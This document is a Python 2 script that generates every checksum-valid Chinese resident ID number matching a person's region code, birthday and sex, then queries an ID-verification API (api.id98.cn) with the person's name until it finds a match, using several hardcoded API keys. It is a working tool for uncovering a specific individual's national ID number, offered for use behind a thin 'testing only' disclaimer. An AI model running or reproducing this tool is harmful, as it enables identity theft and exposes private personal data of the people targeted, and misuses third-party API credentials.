#!/usr/bin/env python
# coding=utf-8
# author:4ido10n[@gmail.com]
# license:GPL v3
# blog:hackfun.org

r'''
Hi,geeker! This script can generate and crack ID card NO.
If you want to carck identity card number you need some 
information about be tested people and correct appkey.
-------------------------WARNING-------------------------
The script is for testing only, not for illegal purposes,
otherwise you will be responsible for all the consequences.
'''

import sys
import time
import json
import datetime
import requests
from divison_code import divison_codes

current_date = datetime.datetime.now().strftime('%Y%m%d')
current_year = datetime.datetime.now().year
appkey = ['db6fb1f5ae343974296cece35e047218', '6d21a53c6bf995e82980c731e32af339', 'bbefe459287faab66731a970d9c85328',
          'bf3dc06b9c1f1fce3c7fddf88be8ebee', 'eddcee3a76d0e5e267044bafbc5b393a', '16285d8106d1500ba77f8473dab75213']
success_msg = {1: 'Consistent.',
               2: 'Inconsistent.',
               3: 'Does not exist this ID card No.'}
fail_msg = {11: 'Incorrect parameter.',
            12: 'Insufficient balance.',
            13: 'The appkey inexistent.',
            14: 'IP was rejected.',
            20: 'The server is in maintenance.'}


def set_coding():
    if sys.getdefaultencoding() is not 'utf-8':
        reload(sys)
        sys.setdefaultencoding('utf-8')


def set_input_coding(coding):
    return coding.decode(sys.stdin.encoding)


def set_output_coding(coding):
    return coding.encode(sys.stdout.encoding)


def find_ID_card(name):
    print '[~] The program is cracking the ID card number.'
    with open('probable_ID_card.txt', 'r') as card_file:
        for line in card_file:
            cardno = line[0:18]
            time.sleep(0.2)
            data = {'cardno': cardno,
                    'name': name,
                    'appkey': appkey[0]}
            url = 'http://api.id98.cn/api/idcard'
            request = requests.get(url, params=data)
            json_data = request.json()
            if json_data['isok'] is 0:
                print '[!] %s' % (set_output_coding(fail_msg[json_data['code']]))
                exit(1)
            with open('query.log', 'a') as log_file:
                current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                log = current_time + '\t' + request.url + '\t' + cardno + \
                    '\t' + name + '\t' + success_msg[json_data['code']] + '\n'
                log_file.write(log)
            if json_data['isok'] is 1:
                print '[>] The program has found the id number successfully -> name:%s ID card number:%s' % (set_output_coding(name), set_output_coding(cardno))
                exit(0)


def generate_ID_card(divison_code, bithday, sex, name):
    print '[~] The program is creating the ID card number.'
    probable_ID_infos = ''
    factor = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    verify_number_list = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
    if sex == 'man':
        for sequence_code in xrange(1, 1000, 2):
            ID_card_base = divison_code + bithday + str(sequence_code).zfill(3)
            checksum = 0
            for i in xrange(len(ID_card_base)):
                checksum += int(ID_card_base[i]) * factor[i]
            mod = checksum % 11
            check_code = verify_number_list[mod]
            probable_ID_number = ID_card_base + check_code + '\t'
            sex = '\t男\t'
            age = str(current_year - int(bithday[0:4])) + '\t'
            province = divison_codes[divison_code[0:2] + '0000']
            city = divison_codes[divison_code[0:4] + '00']
            county = divison_codes[divison_code]
            address = province + city + county
            name = set_output_coding(name)
            probable_ID_info = probable_ID_number + name + sex + age + address + '\n'
            probable_ID_infos += probable_ID_info
            print probable_ID_infos
        with open('probable_ID_card.txt', 'w') as card_file:
            card_file.write(probable_ID_infos)
            card_file.close
        print '[>] The program has generated all ID card numbers -> probable_ID_card.txt'
    elif sex == 'woman':
        for sequence_code in xrange(0, 1000, 2):
            ID_card_base = divison_code + bithday + str(sequence_code).zfill(3)
            checksum = 0
            for i in xrange(len(ID_card_base)):
                checksum += int(ID_card_base[i]) * factor[i]
            mod = checksum % 11
            check_code = verify_number_list[mod]
            probable_ID_number = ID_card_base + check_code + '\t'
            sex = '\t女\t'
            age = str(current_year - int(bithday[0:4])) + '\t'
            province = divison_codes[divison_code[0:2] + '0000']
            city = divison_codes[divison_code[0:4] + '00']
            county = divison_codes[divison_code]
            address = province + city + county
            probable_ID_info = probable_ID_number + name + sex + age + address + '\n'
            probable_ID_infos += probable_ID_info
        with open('probable_ID_card.txt', 'w') as card_file:
            card_file.write(probable_ID_infos)
            card_file.close
        print '[>] The program has generated all ID numbers -> probable_ID_card.txt'
    else:
        print '[!] Sex is invalid.'
        exit(1)


def sex_check(sex):
    if sex.isalpha() is False:
        print '[!] Please input "man" or "woman".'
        exit(1)
    if sex not in ['man', 'woman']:
        print '[!] Please input "man" or "woman".'
        exit(1)
    return sex


def name_check(name):
    for char in name:
        if char < u'\u4e00' or char > u'\u9fa5':
            print '[!] Please input "valid" name.'
            exit(1)
    return name


def bithday_check(bithday):
    if bithday.isdigit() is False:
        print '[!] Please input eight "digits" bithday.'
        exit(1)
    if len(bithday) is not 8:
        print '[!] Please input "eight" digits bithday.'
        exit(1)
    year = int(bithday[0:4])
    month = int(bithday[4:6])
    day = int(bithday[6:8])
    if year not in xrange(1984, current_year + 1):
        print '[!] Please valid "year".'
        exit(1)
    if month not in xrange(1, 13):
        print '[!] Please valid "month".'
        exit(1)
    if day not in xrange(1, 32):
        print '[!] Please valid "day".'
        exit(1)
    if int(bithday) > int(current_date):
        print '[!] Please input valid "bithday".'
        exit(1)
    return bithday


def divison_code_check(divison_code):
    if divison_code.isdigit() is False:
        print '[!] Please input six "digits" administrative division code.'
        exit(1)
    if len(divison_code) != 6:
        print '[!] Please input "six" digits administrative division code.'
        exit(1)
    if divison_code not in divison_codes:
        print '[!] Please input "valid" six digits administrative division code.'
        exit(1)
    return divison_code


def get_input():
    divison_code = raw_input('[*] Input administrative division codes:')
    divison_code = set_input_coding(divison_code)
    divison_code = divison_code_check(divison_code)
    bithday = raw_input('[*] Input bithday:')
    bithday = set_input_coding(bithday)
    bithday = bithday_check(bithday)
    sex = raw_input('[*] Input sex (man or woman):')
    sex = set_input_coding(sex)
    sex = sex_check(sex)
    name = raw_input('[*] Input chinese name:')
    name = set_input_coding(name)
    name = name_check(name)
    return divison_code, bithday, sex, name


def main():
    set_coding()
    divison_code, bithday, sex, name = get_input()
    generate_ID_card(divison_code, bithday, sex, name)
    find_ID_card(name)

if __name__ == '__main__':
    main()
